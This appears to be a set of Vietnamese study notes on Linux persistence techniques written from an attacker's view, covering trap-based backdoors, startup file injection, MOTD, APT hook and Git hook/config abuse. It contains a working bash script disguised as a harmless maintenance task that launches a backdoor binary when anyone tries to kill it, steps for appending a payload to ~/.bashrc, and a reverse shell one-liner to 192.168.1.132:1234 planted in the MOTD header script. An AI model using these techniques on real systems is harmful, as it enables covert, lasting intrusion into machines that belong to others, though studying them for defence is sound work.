**1. Trap**
- trap là một lệnh trong shell script dùng để bắt (catch) các signal hoặc sự kiện hệ thống và thực thi một lệnh/đoạn script khi các signal đó xảy ra. Mục đích chính của trap là giúp script xử lý tình huống bị gián đoạn, thoát bất ngờ, hoặc kết thúc, từ đó làm cho script hoạt động ổn định và đáng tin cậy hơn.
- Cú pháp:
`trap [commands] [signals]`
- Các signal thường dùng:
  + SIGINT: Ngắt chương trình (Ctrl + C)
  + SIGTERM: Yêu cầu kết thúc tiến trình
  + EXIT: Script thoát (bình thường hoặc do signal)
- Tôi sẽ tạo 1 file script giả vờ là 1 tiến trình bảo trì hệ thống vô hại. Script sẽ nằm yên trong 1 giờ. Trong thời gian đó:
  + Không ai động vào => sau 1 giờ tự chạy payload tạo backdoor.
  + Nếu user phát hiện và cố giết nó (Ctrl+C hoặc kill) → ngay lập tức chạy backdoor.
```
#!/bin/bash

run_payload() {
    if [ -f /tmp/backdoor.elf ]; then
        chmod +x /tmp/backdoor.elf
        nohup /tmp/backdoor.elf >/dev/null 2>&1 &
    fi
}

trap run_payload SIGINT SIGTERM EXIT

echo "System maintenance running..." >/dev/null

sleep 3600 &
wait
```
- Script này là một backdoor tự bảo vệ thông minh: Nó ngủ yên giả vờ vô hại, nhưng bất kỳ ai cố giết nó đều vô tình kích hoạt backdoor thật sự.

**2. Backdooring user startup file**
- Backdooring user startup file là kỹ thuật persistence (duy trì truy cập) bằng cách chèn lệnh vào các file được shell tự động thực thi khi user đăng nhập hoặc mở terminal. Với Bash shell trên Linux, các file thường bị lợi dụng là:
  + ~/.bashrc → chạy mỗi khi mở terminal / shell mới
  + ~/.bash_profile → chạy khi login shell
  + ~/.profile → chạy khi user đăng nhập (tuỳ distro)
=> Khi attacker có quyền ghi vào các file này, bất kỳ lệnh nào được thêm vào sẽ tự động chạy mà user không để ý.
- Cách thực hiện:
1. Truy cập file startup: `nano ~/.bashrc`
2. Thêm command vào cuối file: `/home/welcome/payload.elf`
3. Lưu file và thoát
- Từ giờ, mỗi lần user mở terminal, payload sẽ được thực thi

**3. MOTD Backdooring**
- MOTD (Message Of The Day) là thông báo hiển thị cho user khi SSH vào hệ thống Linux. Trên nhiều distro (Ubuntu/Debian), MOTD được tạo động bởi các script trong /etc/update-motd.d/. Mỗi file trong thư mục này là script sẽ được thực thi khi user SSH login.
- Nếu attacker có quyền ghi hoặc chỉnh sửa các file trong /etc/update-motd.d/, attacker có thể chèn thêm command tùy ý hoặc payload; command hoặc payload sẽ được tự động chạy mỗi lần có user SSH vào.
- Cách thực hiện:
1. Chỉnh sửa /etc/update-motd.d/00-header, chèn thêm lệnh `bash -c ‘bash -i >& /dev/tcp/192.168.1.132/1234 0>&1’`
2. Mỗi lần có user SSH vào target, trên máy attacker sẽ nhận được reverse connection.

**4. APT Backdooring**
- APT (Advanced Packaging Tool) là trình quản lý gói mặc định trên các hệ điều hành Linux dựa trên Debian như Debian, Ubuntu, Kali Linux. APT cho phép người quản trị cài đặt, gỡ bỏ và cập nhật các gói phần mềm cũng như cập nhật toàn bộ hệ thống. Các cấu hình của APT chủ yếu được lưu trữ trong thư mục /etc/apt.
- APT hỗ trợ một cơ chế gọi là hook, cho phép thực thi các lệnh hoặc script trước hoặc sau khi các hành động quản lý gói diễn ra, chẳng hạn như apt update, apt install hoặc apt upgrade. Trong điều kiện bình thường, hook được sử dụng nhằm mục đích bảo trì hệ thống, đảm bảo tính ổn định và tránh lỗi trong quá trình cập nhật phần mềm.
- Tuy nhiên, từ góc nhìn của kẻ tấn công, cơ chế hook này có thể bị lạm dụng để thiết lập persistence. Nếu attacker có quyền chỉnh sửa hoặc tạo mới APT hook, các lệnh được chèn vào hook sẽ tự động được thực thi mỗi khi người quản trị chạy các lệnh APT. Do các thao tác APT thường được thực hiện với quyền cao, việc lạm dụng hook có thể cho phép attacker duy trì quyền truy cập vào hệ thống một cách âm thầm và khó bị phát hiện.

**5. Git Backdooring**
- Git là một hệ thống quản lý phiên bản phân tán (Distributed Version Control System – DVCS), được sử dụng phổ biến để theo dõi thay đổi của mã nguồn và hỗ trợ nhiều lập trình viên làm việc cộng tác trong quá trình phát triển phần mềm. Ngoài chức năng quản lý mã nguồn, Git còn cung cấp một số cơ chế mở rộng có thể bị lạm dụng cho mục đích duy trì truy cập, trong đó đáng chú ý là Git hooks và file cấu hình (config).

*Git Hooks*
- Git hỗ trợ cơ chế hooks, cho phép thực thi các script tự động tại những thời điểm nhất định trong vòng đời làm việc với repository, chẳng hạn như pre-commit, post-commit, pre-merge hoặc post-merge. Các hook này được thiết kế nhằm phục vụ các mục đích hợp pháp như kiểm tra chất lượng mã nguồn, tự động hoá quy trình build hoặc đảm bảo tuân thủ các quy chuẩn phát triển phần mềm.
- Các Git hook được lưu trữ trong thư mục .git/hooks/ của repository. Mỗi hook có tên cố định, tương ứng với sự kiện mà nó được kích hoạt, và không thể đặt tên tuỳ ý. Để hook hoạt động, file script cần được cấp quyền thực thi.
- Từ góc nhìn của kẻ tấn công, Git hooks có thể bị lạm dụng để thiết lập persistence. Nếu attacker có khả năng chỉnh sửa repository hoặc thêm hook vào thư mục .git/hooks/, các lệnh được chèn vào hook sẽ tự động được thực thi khi developer thực hiện các thao tác Git tương ứng. Điều này có thể dẫn đến việc duy trì quyền truy cập hoặc thực thi mã trái phép mỗi khi repository được sử dụng, trong khi vẫn khó bị phát hiện do hook là một tính năng hợp pháp của Git.

*Git Config*
- Ngoài cơ chế hooks, Git còn sử dụng các file cấu hình (config) và biến môi trường (environment variables) để kiểm soát hành vi của các lệnh Git trong quá trình sử dụng. Một số biến môi trường này có khả năng chỉ định các chương trình hoặc lệnh sẽ được thực thi khi một hành động Git cụ thể diễn ra.
- Một ví dụ điển hình là biến môi trường GIT_PAGER, được sử dụng để xác định chương trình hiển thị đầu ra khi người dùng thực thi các lệnh như git log. Khi lệnh tương ứng được gọi, Git sẽ sử dụng giá trị của biến này để khởi chạy pager đã được cấu hình.
- Các thiết lập liên quan đến biến môi trường và hành vi của Git không chỉ có thể được cấu hình tạm thời trong môi trường làm việc, mà còn có thể được lưu cố định trong các file cấu hình như:
  + .git/config (cấu hình riêng cho từng repository)
  + ~/.gitconfig (cấu hình toàn cục cho user)
- Từ góc nhìn của kẻ tấn công, việc chỉnh sửa các file cấu hình Git hoặc lợi dụng các biến môi trường có thể trở thành một phương pháp persistence. Nếu attacker có quyền ghi vào các file cấu hình này, họ có thể thiết lập các tuỳ chọn khiến Git tự động thực thi các lệnh tùy ý mỗi khi người dùng chạy một số lệnh Git phổ biến. Do các lệnh Git thường xuyên được developer sử dụng, kỹ thuật này cho phép attacker duy trì quyền truy cập hoặc thực thi mã một cách âm thầm và khó phát hiện.
